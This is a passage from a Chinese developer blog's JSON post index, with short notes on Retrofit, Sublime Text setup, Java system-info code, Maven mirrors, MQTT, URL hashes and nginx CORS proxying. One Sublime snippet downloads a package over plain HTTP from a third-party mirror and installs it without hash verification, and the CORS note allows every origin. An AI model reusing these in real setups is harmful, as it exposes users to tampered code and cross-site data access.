android:name=&quot;android.permission.MOUNT_UNMOUNT_FILESYSTEMS&quot;/&gt; &lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;/&gt; &lt;uses-permission android:name=&quot;android.permission.READ_CALL_LOG&quot;/&gt; &lt;uses-permission android:name=&quot;android.permission.READ_SMS&quot;/&gt;&lt;/manifest&gt;","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[]},{"title":"在Android上用一个简单的GET请求了解Retrofit是怎么用的","slug":"Android/在Android上用一个简单的GET请求了解Retrofit是怎么用的","date":"2016-08-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.127Z","comments":true,"path":"Android/在Android上用一个简单的GET请求了解Retrofit是怎么用的/","link":"","permalink":"http://yoursite.com/Android/在Android上用一个简单的GET请求了解Retrofit是怎么用的/","excerpt":"","text":"http://square.github.io/retrofit/ 准备引入12compile &apos;com.squareup.retrofit2:retrofit:2.0.0&apos;compile &apos;com.squareup.retrofit2:converter-gson:2.+&apos; 权限1&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt; 协议1/api/v1/user/login/&#123;name&#125;/&#123;passwd&#125; Curl1curl -X GET --header &apos;Accept: application/json&apos; &apos;http://192.168.1.219/api/v1/user/login/sam/123&apos; 开始写代码写一个API接口123456789import retrofit2.Call;import retrofit2.http.GET;import retrofit2.http.Path;public interface LoginService &#123; @GET(&quot;/api/v1/user/login/&#123;name&#125;/&#123;passwd&#125;&quot;) Call&lt;Login&gt; login(@Path(&quot;name&quot;) String name , @Path(&quot;passwd&quot;) String passwd);&#125; 请求响应的Model1234567891011121314151617181920212223242526272829public class Login &#123; private int code; private String token; @Override public String toString() &#123; return &quot;LoginDemo&#123;&quot; + &quot;code=&quot; + code + &quot;, token=&apos;&quot; + token + &apos;\\&apos;&apos; + &apos;&#125;&apos;; &#125; public int getCode() &#123; return code; &#125; public void setCode(int code) &#123; this.code = code; &#125; public String getToken() &#123; return token; &#125; public void setToken(String token) &#123; this.token = token; &#125;&#125; 分别使用了同步和异步（推荐异步）1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import android.support.v7.app.AppCompatActivity;import android.os.Bundle;import android.util.Log;import android.widget.TextView;import java.io.IOException;import retrofit2.Call;import retrofit2.Callback;import retrofit2.Response;import retrofit2.Retrofit;import retrofit2.converter.gson.GsonConverterFactory;public class MainActivity extends AppCompatActivity &#123; TextView tv; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); tv = (TextView)findViewById(R.id.tv); Retrofit loginRetrofit = new Retrofit.Builder() .baseUrl(&quot;http://192.168.1.219&quot;) .addConverterFactory(GsonConverterFactory.create()) .build(); LoginService loginService = loginRetrofit.create(LoginService.class); final Call&lt;Login&gt; result = loginService.login(&quot;sam&quot;, &quot;123&quot;); //同步 new Thread() &#123; @Override public void run() &#123; super.run(); try &#123; //result实例只能用一次，clone可以生成另外一个相同的实例 //这里是同步执行，不能在UI线程执行 Log.e(&quot;onCreate: 同步&quot;, result.clone().execute().body().toString()); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; &#125;.start(); //异步 result.enqueue(new Callback&lt;Login&gt;() &#123; @Override public void onResponse(Call&lt;Login&gt; call, Response&lt;Login&gt; response) &#123; //Do something with response Log.i(&quot;onResponse: 异步&quot;, &quot;code = &quot; + response.code()); if (response.body() != null)&#123; Log.i(&quot;onResponse: 异步&quot;, response.body().toString()); tv.setText(response.body().toString()); &#125; &#125; @Override public void onFailure(Call&lt;Login&gt; call, Throwable t) &#123; //Do something with failure Log.e(&quot;onFailure: 异步&quot;, t.toString()); &#125; &#125;); &#125;&#125;","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[]},{"title":"Sublime-Text-3-设置","slug":"IDE/Sublime-Text-3-设置","date":"2016-08-30T01:52:36.000Z","updated":"2016-08-30T01:52:36.000Z","comments":true,"path":"IDE/Sublime-Text-3-设置/","link":"","permalink":"http://yoursite.com/IDE/Sublime-Text-3-设置/","excerpt":"","text":"安装Sublime-Text3Windows直接下载exe安装包 Ubuntu官网上推荐的安装方法，可能因网络原因无法访问不。 1234$ wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add -$ echo \"deb https://download.sublimetext.com/ apt/stable/\" | sudo tee /etc/apt/sources.list.d/sublime-text.list$ sudo apt-get update$ sudo apt-get install sublime-text 其实，在Ubuntu的软件中心可以搜索到，直接在上面安装就好。 安装插件 package control打开packagecontrol.io复制代码1import urllib.request,os,hashlib; h = &apos;6f4c264a24d933ce70df5dedcf1dcaee&apos; + &apos;ebe013ee18cced0ef93d5f746d80ef60&apos;; pf = &apos;Package Control.sublime-package&apos;; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); by = urllib.request.urlopen( &apos;http://packagecontrol.io/&apos; + pf.replace(&apos; &apos;, &apos;%20&apos;)).read(); dh = hashlib.sha256(by).hexdigest(); print(&apos;Error validating download (got %s instead of %s), please try manual install&apos; % (dh, h)) if dh != h else open(os.path.join( ipp, pf), &apos;wb&apos; ).write(by) 可能由于网络原因，无法访问packagecontrol.io 或者用这段代码（网上找的）1import urllib.request,os; pf = &apos;Package Control.sublime-package&apos;; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); open(os.path.join(ipp, pf), &apos;wb&apos;).write(urllib.request.urlopen( &apos;http://sublime.wbond.net/&apos; + pf.replace(&apos; &apos;,&apos;%20&apos;)).read()) 按Ctrl+`调出console（注：避免热键冲突）,粘贴代码到命令行并回车： 重启Sublime Text 3,如果在Perferences-&gt;package settings中看到package control这一项，则安装成功。 使用 package control 安装插件按下Ctrl+Shift+P调出命令面板，输入install 调出 Install Package 选项并回车，然后在输入要安装的插件 常用插件12345ChineseLocalizationsEmmetBracketHighlighterjQueryGit 更多 新建标签打开文件Preferences–&gt;Settings 中把 Preferences.sublime–User 的 “open_files_in_new_window”: true123456789&#123; &quot;font_size&quot;: 11, &quot;ignored_packages&quot;: [ &quot;Vintage&quot; ], &quot;open_files_in_new_window&quot;: true, &quot;preview_on_click&quot;: false&#125; Sublime Text 3 在设置 open_files_in_new_window 之后单击文件还是只在一个标签上，原因是： 单击是预览，双击才是打开一个文件， preview_on_click，设置 false 之后就可以了，单击选中文件， 双击 打开新文件。 代码缩进首选项–&gt;快捷键设置1234[&#123;&quot;keys&quot;: [&quot;ctrl+i&quot;], &quot;command&quot;: &quot;reindent&quot; , &quot;args&quot;:&#123;&quot;single_line&quot;: false&#125;&#125;]","categories":[{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/categories/IDE/"}],"tags":[]},{"title":"Java获取Linux系统资源信息","slug":"Java/Java获取Linux系统资源信息","date":"2016-08-30T01:52:36.000Z","updated":"2016-08-30T01:52:36.000Z","comments":true,"path":"Java/Java获取Linux系统资源信息/","link":"","permalink":"http://yoursite.com/Java/Java获取Linux系统资源信息/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687import java.io.BufferedReader;import java.io.IOException;import java.io.InputStreamReader;import java.util.ArrayList;import java.util.HashMap;import java.util.List;public class Test &#123;public static void main(String[] args) throws IOException &#123; //cat /proc/meminfo String commands=&quot;cat /proc/meminfo&quot;; //String message= runCommands(commands); //System.out.println(message); getDiskInfo(1); &#125; public static String runCommands(String commands) throws IOException&#123; Process process = Runtime.getRuntime().exec(commands); InputStreamReader ir = new InputStreamReader(process.getInputStream(), &quot;UTF-8&quot;); BufferedReader input = new BufferedReader(ir); String line; String message=&quot;&quot;; while ((line = input.readLine()) != null) &#123; //System.out.println(&quot;+++&quot;+line); message = message + line + &quot;\\n&quot; ; &#125; return message; &#125; public static List&lt;List&gt; getDiskInfo(int sda_number) throws IOException&#123; String commands = &quot;df -h |grep /dev/sda&quot;+sda_number;// String commands = &quot;df -h&quot;; Process process = Runtime.getRuntime().exec(commands); InputStreamReader ir = new InputStreamReader(process.getInputStream(), &quot;UTF-8&quot;); BufferedReader input = new BufferedReader(ir); String line; List&lt;List&gt; result = new ArrayList(); /** * [文件系统, 容量, 已用, 可用, 已用%, 挂载点] * [/dev/sda1, 8.3G, 6.4G, 1.5G, 82%, /] */ while ((line = input.readLine()) != null) &#123; //System.out.println(&quot;----------&quot;+line); String[] temp = line.split(&quot; &quot;); List&lt;String&gt; list_dev_sda = new ArrayList(); for (String string : temp) &#123; string = string.replaceAll(&quot; &quot;, &quot;&quot;); if(!string.equals(&quot;&quot;))&#123; //System.out.println(string); list_dev_sda.add(string); &#125; &#125; System.out.println(list_dev_sda.toString()); result.add(list_dev_sda); &#125; return result; &#125; public static HashMap&lt;String, Float&gt; getMemInfo() throws IOException&#123; String commands = &quot;cat /proc/meminfo&quot;; Process process = Runtime.getRuntime().exec(commands); InputStreamReader ir = new InputStreamReader(process.getInputStream(), &quot;UTF-8&quot;); BufferedReader input = new BufferedReader(ir); //读第一行和第二行 String[] memTotalArray = input.readLine().replace(&quot; &quot;, &quot;&quot;).split(&quot;:&quot;); String[] memFreeArray = input.readLine().replace(&quot; &quot;, &quot;&quot;).split(&quot;:&quot;); float memTotal = Float.valueOf(memTotalArray[1].replace(&quot;kB&quot;, &quot;&quot;)); float memFree = Float.valueOf(memFreeArray[1].replace(&quot;kB&quot;, &quot;&quot;)); System.out.println(&quot;memTotal = &quot;+memTotal/(1024*1024) + &quot;GB&quot;); System.out.println(&quot;memFree = &quot;+memFree/1024 + &quot;MB&quot;); HashMap&lt;String, Float&gt; mem = new HashMap&lt;&gt;(); mem.put(&quot;memTotal&quot;, memTotal); mem.put(&quot;memFree&quot;, memFree); return mem; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/categories/Java/"}],"tags":[]},{"title":"Android Ndk课程","slug":"Android/Android Ndk课程","date":"2016-08-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.097Z","comments":true,"path":"Android/Android Ndk课程/","link":"","permalink":"http://yoursite.com/Android/Android Ndk课程/","excerpt":"","text":"https://ke.qq.com/course/130901","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"ndk","slug":"ndk","permalink":"http://yoursite.com/tags/ndk/"}]},{"title":"Apache-Maven-入门","slug":"Web后端/Apache-Maven-入门","date":"2016-08-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.199Z","comments":true,"path":"Web后端/Apache-Maven-入门/","link":"","permalink":"http://yoursite.com/Web后端/Apache-Maven-入门/","excerpt":"","text":"Apache Maven 入门篇 ( 上 )本文着重动手，用 maven 来构建运行 hellow world 程序，体会一下不用任何 IDE ，只用 maven 是咋回事。 Apache Maven 入门篇(下) * POM (Project Object Model) * Maven 插件 * Maven 生命周期 * Maven 依赖管理 * Maven 库 我的 Maven Setting.xml 的mirrors配置 12345678910111213141516171819202122232425262728293031323334&lt;mirrors&gt; &lt;mirror&gt; &lt;id&gt;aliyunmaven&lt;/id&gt; &lt;name&gt;aliyun public maven&lt;/name&gt; &lt;url&gt;https://maven.aliyun.com/repository/public&lt;/url&gt; &lt;mirrorOf&gt;public&lt;/mirrorOf&gt; &lt;/mirror&gt; &lt;mirror&gt; &lt;id&gt;alimaven&lt;/id&gt; &lt;name&gt;aliyun central maven&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;/mirror&gt; &lt;mirror&gt; &lt;id&gt;ui&lt;/id&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;name&gt;Human Readable Name for this Mirror.&lt;/name&gt; &lt;url&gt;http://uk.maven.org/maven2/&lt;/url&gt; &lt;/mirror&gt; &lt;mirror&gt; &lt;id&gt;jboss-public-repository-group&lt;/id&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;name&gt;JBoss Public Repository Group&lt;/name&gt; &lt;url&gt;http://repository.jboss.org/nexus/content/groups/public&lt;/url&gt; &lt;/mirror&gt; &lt;/mirrors&gt;","categories":[{"name":"Web后端","slug":"Web后端","permalink":"http://yoursite.com/categories/Web后端/"}],"tags":[]},{"title":"一款由python编写开源的跳板机(堡垒机)系统","slug":"Web后端/一款由python编写开源的跳板机(堡垒机)系统","date":"2016-08-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.217Z","comments":true,"path":"Web后端/一款由python编写开源的跳板机(堡垒机)系统/","link":"","permalink":"http://yoursite.com/Web后端/一款由python编写开源的跳板机(堡垒机)系统/","excerpt":"","text":"类似青云那样的管理Linux主机的Web系统 https://github.com/jumpserver/jumpserver/wiki/ http://www.oschina.net/p/jumpserver","categories":[{"name":"Web后端","slug":"Web后端","permalink":"http://yoursite.com/categories/Web后端/"}],"tags":[]},{"title":"云存储平台Seafile","slug":"Web后端/云存储平台Seafile","date":"2016-08-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.217Z","comments":true,"path":"Web后端/云存储平台Seafile/","link":"","permalink":"http://yoursite.com/Web后端/云存储平台Seafile/","excerpt":"","text":"https://github.com/haiwen/seafile Seafile 的目标是给企业提供一个安全的云存储平台，满足企业文件的共享和协作的需求。 Seafile 采用开源的方式来进行产品开发。开源帮助 Seafile 成为了一个国际化的项目，并吸引了全球用户的参与和贡献。目前我们已经在 Github 开源代码托管平台上有了 3900 多个关注。全球用户的使用、反馈和审核使得 Seafile 更加的安全和稳定。 截至 2016 年初，Seafile 已经有超过 30 万用户使用，并拥有卡巴斯基，德国 Mainz 大学，德国 HU Berlin 大学和法国 Strasbourg 大学等大型组织机构客户。 https://www.seafile.com/home/","categories":[{"name":"Web后端","slug":"Web后端","permalink":"http://yoursite.com/categories/Web后端/"}],"tags":[]},{"title":"Html5使用MQTT","slug":"前端/Html5使用MQTT","date":"2016-08-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.248Z","comments":true,"path":"前端/Html5使用MQTT/","link":"","permalink":"http://yoursite.com/前端/Html5使用MQTT/","excerpt":"","text":"测试工具：MQTTLens，MQTTBox 测试服务地址：123456781. mosquittomqtt://test.mosquitto.orgws://test.mosquitto.org:8080/mqtt (没连上)测试页面：http://test.mosquitto.org/ws.html2. eclipsetcp://iot.eclipse.orgws://iot.eclipse.org:80/ws MQTT Client 比较多，各种语言都有开源项目，基本都是基于TCP/IP的，如Java/OC/Swift/nodejs/C/C++等。 H5上的js也可以使用MQTT，只不过是基于WebSocket，用法和其他语言的有一点点区别。 MQTT.js 是一个开源项目，支持nodejs和Browser js ，这里对比一下nodejs和Browser js的用法： 注：nodejs是运行在webserver的js，Browser js意思是运行在浏览器上的js，也就是H5用到的js注：目前项目方已经提供 CDN，不需要自己打包https://unpkg.com/mqtt/dist/mqtt.min.js nodejs12345678910111213var mqtt = require(&apos;mqtt&apos;);var client = mqtt.connect(&apos;mqtt://test.mosquitto.org&apos;);client.on(&apos;connect&apos;, function () &#123; client.subscribe(&apos;presence&apos;); client.publish(&apos;presence&apos;, &apos;Hello mqtt&apos;);&#125;);client.on(&apos;message&apos;, function (topic, message) &#123; // message is Buffer console.log(message.toString()); client.end();&#125;); Browser js首先要通过webpack 把运行在nodejs上的mqtt.js打包为 browserMqtt.js 12345678910111213141516171819&lt;html&gt;&lt;head&gt; &lt;title&gt;test Ws mqtt.js&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script src=&quot;./browserMqtt.js&quot;&gt;&lt;/script&gt;&lt;script&gt; var client = mqtt.connect(); // you add a ws:// url here client.subscribe(&quot;mqtt/demo&quot;); client.on(&quot;message&quot;, function(topic, payload) &#123; alert([topic, payload].join(&quot;: &quot;)); client.end(); &#125;); client.publish(&quot;mqtt/demo&quot;, &quot;hello world!&quot;); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; MQTT.js的示例只是说明you add a ws:// url here，但是没有给出url的地址，H5上的地址格式有一点点区别，以host=192.168.1.88，port=8083为例： 示例中的写法：12var client = mqtt.connect(&apos;ws://192.168.1.88:8083&apos;); client.subscribe(&quot;mqtt/demo&quot;); 这种写法subscribe的topic是以 &#39;mqtt/&#39; 开头的。 另外一种写法12345var client = mqtt.connect(&apos;ws://192.168.1.88:8083/mqtt&apos;); &apos;ws://&apos; + &apos;HOST&apos; + &apos;PORT&apos; + &apos;mqtt&apos;client.subscribe(&quot;demo&quot;); 注意：这里面有两个关键字ws和mqtt MQTT的默认端口是1883，几乎是一个标准端口，但是websocket都不太一样，比如： emqtt， websocket默认的端口是8083。 mosquitto ，websocket默认的端口是9001，但是mosquitto 默认是不开启websocket，你要配置一下，或者安装相关的lib，这要看具体版本而定。Ubuntu mosquitto-1.4.5支持Websocket 设置连接用户名密码在连接的方法传入参数，类似的还有clientid等参数1234var client = mqtt.connect(host,&#123;username:&quot;hellouser&quot;,password:&quot;hellopasswd&quot;&#125;); 支持微信小程序Example(js)12var mqtt = require(&apos;mqtt&apos;)var client = mqtt.connect(&apos;wxs://test.mosquitto.org&apos;) Example(ts)12import &#123; connect &#125; from &apos;mqtt&apos;;const client = connect(&apos;wxs://test.mosquitto.org&apos;); 一个完整的Html5 Client github 传送门 注：项目更新了很多，文章没有及时更新，建议看https://github.com/mqttjs/MQTT.js/blob/master/README.md","categories":[{"name":"前端","slug":"前端","permalink":"http://yoursite.com/categories/前端/"}],"tags":[]},{"title":"JS获取URL中#后面的参数","slug":"前端/JS获取URL中#后面的参数","date":"2016-08-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.249Z","comments":true,"path":"前端/JS获取URL中#后面的参数/","link":"","permalink":"http://yoursite.com/前端/JS获取URL中#后面的参数/","excerpt":"","text":"1234567&lt;script language=&quot;javascript&quot;&gt;function getarg(url)&#123;arg=url.split(&quot;#&quot;);return arg[1];&#125; alert(getarg(&apos;http://www.iswtf.com/test.php#ID=58&apos;));&lt;/script&gt; 昨天遇到这个问题：在A页面中通过location.href跳转到另一个B页面，此跳转地址是http://www.xyz.com/aa.html#bb.html?param=xxx 现在要怎么在B页面中取到param的值？现在的情况是跳到B页面后地址栏显示的就是http://www.xyz.com/aa.html#bb.html 后面的参数部分没有了，取到的参数值也是空的 搞了好久也没出来，最后问了大牛才发现我的基本功不行啊 理解就出错了，#后的内容都不会传到服务端的，所以到新页面看到的地址栏中就没有#后的参数，经大牛指点，把地址改为：http://www.xyz.com/aa.html?param=xxx#bb.html 就是先加参数，再加# 因为这个页面是有iframe的，所以其实也是传参数到aa.html的，并不是bb.html具体细看下下列的各对象说明就明白了location：子对象document.location.hash // #号后的部分document.location.host // 域名+端口号document.location.hostname // 域名document.location.href // 完整URLdocument.location.pathname // 目录部分document.location.port // 端口号document.location.protocol // 网络协议(http:)document.location.search // ?号后的部分 然后到跳转后的页面处理这个地址就可以取到参数值了，方法： //取到上一页面传过来的参数 var $ = $ || {}; $.getParam = function( key, strURL ){ strURL = strURL || window.location.search; return new RegExp( \"(^|\\\\?|&)\" + key + \"=([^&]*)(\\\\s|&|$)\", \"i\" ).test( strURL ) ? decodeURIComponent( RegExp.$2.replace( /\\+/g, \" \" ) ) : \"\"; }; // console.log($.getParam(‘param‘)); //第二个参数不传拿当前window.location 用于普通页面 // console.log($.getParam(‘param‘,top.window.location)); //用于包括有iframe的页面,得到的结果是xxx#bbb.html console.log($.getParam(‘param‘,top.window.location.search)); //用于有iframe的页面，search是指里面的参数，hash是指#后的内容 得到的结果是xxx 再引用一下http://www.cnblogs.com/kaituorensheng/p/3776527.html内容，说明下# URL中“#” “？” &amp;“”号的作用 # 10年9月，twitter改版。一个显著变化，就是URL加入了”#!”符号。比如，改版前的用户主页网址为http://twitter.com/username改版后，就变成了http://twitter.com/#!/username location是javascript里边管理地址栏的内置对象，比如location.href就管理页面的url，用location.href=url就可以直接将页面重定向url。而location.hash则可以用来获取或设置页面的标签值。比如http://domain/#admin的location.hash=&quot;#admin&quot;。利用这个属性值可以做一个非常有意义的事情。很多人都喜欢收藏网页，以便于以后的浏览。不过对于Ajax页面来说的话，一般用一个页面来处理所有的事务，也就是说，如果你浏览到一个Ajax页面里边有意思的内容，想将它收藏起来，可是地址只有一个呀，下次你打开这个地址，还是得像以往一样不断地去点击网页，找到你钟情的那个页面。另外的话，浏览器上的“前进”“后退”按钮也会失效，这于很多习惯了传统页面的用户来说，是一个很大的使用障碍。那么，怎么用location.hash来解决这两个问题呢？其实一点也不神秘。比如，我的作者管理系统，主要功能有三个：普通搜索、高级搜索、后台管理，我分别给它们分配一个hash值：#search、#advsearch、#admin，在页面初始化的时候，通过window.location.hash来判断用户需要访问的页面，然后通过javascript来调整显示页面。比如： var hash;hash=(!window.location.hash)?”#search”:window.location.hash;window.location.hash=hash;//调整地址栏地址，使前进、后退按钮能使用switch(hash){case “#search”:selectPanel(“pnlSearch”); //显示普通搜索面板break;case “#advsearch”:case “#admin”:} 通过window.location.hash=hash这个语句来调整地址栏的地址，使得浏览器里边的“前进”、“后退”按钮能正常使用（实质上欺骗了浏览器）。然后再根据hash值的不同来显示不同的面板（用户可以收藏对应的面板了），这就使得Ajax页面的浏览趋于传统化了。 1234获取#的位置截取字符串的形式 例如： var url=window.location.href;//获取地址栏 url var index=url.indexOf(&apos;#&apos;);//获取#的位置 var paramVal=url.substr(index,url.length);//获取 # 后面所有字符串","categories":[{"name":"前端","slug":"前端","permalink":"http://yoursite.com/categories/前端/"}],"tags":[]},{"title":"Xenon基于Bootstrap的响应式后台管理模版","slug":"前端/Xenon基于Bootstrap的响应式后台管理模板","date":"2016-08-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.254Z","comments":true,"path":"前端/Xenon基于Bootstrap的响应式后台管理模板/","link":"","permalink":"http://yoursite.com/前端/Xenon基于Bootstrap的响应式后台管理模板/","excerpt":"","text":"https://www.uedsc.com/xenon.html Xenon响应式后台管理模板，全套模板，包含后台登录页面、仪表盘、皮肤选择、布局、UI元素、按钮、标签和手风琴、模态、进度条、导航栏、警报、分页、小工具、邮箱、表格、表单、地图、画廊、图标、日历、图像裁切、404错误页、排行榜等共127个后台模板页面。 Xenon HTML模板是一款后台面板 HTML模板。模板特点：4个仪表盘，28个布局，UI 元素，在线洽谈，时间轴，相册管理，皮肤创建，通告，各种应用元素，提供说明文档等。","categories":[{"name":"前端","slug":"前端","permalink":"http://yoursite.com/categories/前端/"}],"tags":[]},{"title":"nginx解决ajax跨域问题笔记","slug":"前端/nginx解决ajax跨域问题笔记","date":"2016-08-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.255Z","comments":true,"path":"前端/nginx解决ajax跨域问题笔记/","link":"","permalink":"http://yoursite.com/前端/nginx解决ajax跨域问题笔记/","excerpt":"","text":"问题： 前后端分离 前端在编写阶段（机器IP:192.168.1.11），后端已经部署好，数据通过REST API提供（机器IP:192.168.1.33:8000/api/） 跨域问题，就算是端口不一样也会出现。 解决跨域问题有多种，这里选择nginx代理。 ####nginx配置 nginx默认监听80端口，由于是编码阶段，我们不改动。 新建一个server监听8080，并且将http://localhost:8080/api全部转发到http://192.168.1.33:8000/api 1234567891011121314 server &#123; listen 8080; server_name localhost:8080; location / &#123; root F:/html/myHtmlTest; index index.html index.htm; &#125; location /api &#123; proxy_pass http://192.168.1.33:8000/api; &#125; &#125;``` 或者 server { listen 8080; server_name localhost:8080; location / { root F:/html/myHtmlTest; index index.html index.htm; } location /api/ { proxy_pass http://192.168.1.33:8000; } } 1两种写法效果一样，区别在于 location /api { proxy_pass http://192.168.1.33:8000/api; } #这样写proxy_pass不会带上location的“/api ”,所以改成这样location /test{ proxy_pass http://192.168.1.33:8000/api; } #目标访问地址也是不变的 #但是我们访问就应该是 http://192.168.1.11:8080/test #转发到 http://192.168.1.33:8000/api1234567```location /api/ &#123; proxy_pass http://192.168.1.33:8000; &#125;#这种写法的`proxy_pass`会把`location`的“/api/ ”带上#当访问 http://192.168.1.11:8080/api/ #就会转发为 http://192.168.1.33:8000/api/ 前端html文件（如test.html）放在location /.root的目录下（如F:/html/myHtmlTest） 通过http://localhost:8080/test.html 访问html文件 ajax访问资源 var url = “http://localhost:8080/api/v1/hello/&quot;; nginx会将api转发到http://192.168.1.33:8000/api; Linux下的配置文件include了其他默认的配置，可以在里面配置server，如果不需要可以注释掉。1234567891011121314151617181920212223 include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*;/etc/nginx/sites-enabled/default文件就是设置默认的端口和目录，内容如：# Default server configuration#server &#123; listen 80 default_server; listen [::]:80 default_server; root /var/www/html; # Add index.php to the list if you are using PHP index index.html index.htm index.nginx-debian.html; server_name _; location / &#123; # First attempt to serve request as file, then # as directory, then fall back to displaying a 404. try_files $uri $uri/ =404; &#125;&#125; nginx配置文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135#user nobody;worker_processes 1;#error_log logs/error.log;#error_log logs/error.log notice;#error_log logs/error.log info;#pid logs/nginx.pid;events &#123; worker_connections 1024;&#125;http &#123; include mime.types; default_type application/octet-stream; #log_format main &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos; # &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos; # &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;; #access_log logs/access.log main; sendfile on; #tcp_nopush on; #keepalive_timeout 0; keepalive_timeout 65; #gzip on; server &#123; listen 80; server_name localhost; #charset koi8-r; #access_log logs/host.access.log main; location / &#123; root html; index index.html index.htm; &#125; #location /api &#123; # proxy_pass http://192.168.1.150:8000/api; #&#125; #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125; # proxy the PHP scripts to Apache listening on 127.0.0.1:80 # #location ~ \\.php$ &#123; # proxy_pass http://127.0.0.1; #&#125; # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # #location ~ \\.php$ &#123; # root html; # fastcgi_pass 127.0.0.1:9000; # fastcgi_index index.php; # fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name; # include fastcgi_params; #&#125; # deny access to .htaccess files, if Apache&apos;s document root # concurs with nginx&apos;s one # #location ~ /\\.ht &#123; # deny all; #&#125; &#125; server &#123; listen 8080; server_name localhost:8080; location / &#123; root F:/html/myHtmlTest; index index.html index.htm; &#125; location /api &#123; proxy_pass http://192.168.1.33:8000/api; &#125; &#125; # another virtual host using mix of IP-, name-, and port-based configuration # #server &#123; # listen 8000; # listen somename:8080; # server_name somename alias another.alias; # location / &#123; # root html; # index index.html index.htm; # &#125; #&#125; # HTTPS server # #server &#123; # listen 443 ssl; # server_name localhost; # ssl_certificate cert.pem; # ssl_certificate_key cert.key; # ssl_session_cache shared:SSL:1m; # ssl_session_timeout 5m; # ssl_ciphers HIGH:!aNULL:!MD5; # ssl_prefer_server_ciphers on; # location / &#123; # root html; # index index.html index.htm; # &#125; #&#125;&#125;","categories":[{"name":"前端","slug":"前端","permalink":"http://yoursite.com/categories/前端/"}],"tags":[{"name":"nginx","slug":"nginx","permalink":"http://yoursite.com/tags/nginx/"}]},{"title":"服务端解决前端ajax跨域","slug":"前端/服务端解决前端ajax跨域","date":"2016-08-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.258Z","comments":true,"path":"前端/服务端解决前端ajax跨域/","link":"","permalink":"http://yoursite.com/前端/服务端解决前端ajax跨域/","excerpt":"","text":"在响应头加入123Access-Control-Allow-Headers →x-requested-with,content-typeAccess-Control-Allow-Methods →POSTAccess-Control-Allow-Origin →* 表示允许任何域名跨域访问，客户端访问示例 ：传送门","categories":[{"name":"前端","slug":"前端","permalink":"http://yoursite.com/categories/前端/"}],"tags":[]},{"title":"虾米歌曲搜索接口","slug":"开放API/虾米歌曲搜索接口","date":"2016-08-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.287Z","comments":true,"path":"开放API/虾米歌曲搜索接口/","link":"","permalink":"http://yoursite.com/开放API/虾米歌曲搜索接口/","excerpt":"","text":"alibaba.music.search.songs.get (虾米歌曲搜索5.0接口)","categories":[{"name":"开放API","slug":"开放API","permalink":"http://yoursite.com/categories/开放API/"}],"tags":[]},{"title":"生成Banner的网站","slug":"随笔/生成Banner的网站","date":"2016-08-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.310Z","comments":true,"path":"随笔/生成Banner的网站/","link":"","permalink":"http://yoursite.com/随笔/生成Banner的网站/","excerpt":"","text":"英文文字 ascii 生成 图片生成 ascii 更多网站搜索“ascii art generator” ASCII Art：使用纯文本流程图 ditaa AsciiCam","categories":[{"name":"随笔","slug":"随笔","permalink":"http://yoursite.com/categories/随笔/"}],"tags":[]},{"title":"记一次VMWare的vcpu-0错误","slug":"虚拟化技术&云平台/记一次VMWare的vcpu-0错误","date":"2016-08-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.302Z","comments":true,"path":"虚拟化技术&云平台/记一次VMWare的vcpu-0错误/","link":"","permalink":"http://yoursite.com/虚拟化技术&云平台/记一次VMWare的vcpu-0错误/","excerpt":"","text":"环境：Windows10下在WM中安装Linux错误信息大概如下1vcpu-0:VERIFY vmcore/vmm/main/cpuid.c:382 bugNr=1036521 本来vm一直在正常运行，发生这次错误是在电脑（Windows10）的一次不正常关机（断电）之后。 cpu的相关设置记得没有改，vm有些功能是需要电脑开启虚拟cpu技术的（Intel virtual technology），这在装wm的系统时已经开启过了，估计电脑不正常关机导致恢复默认值了。 在BIOS中找到 Intel virtual 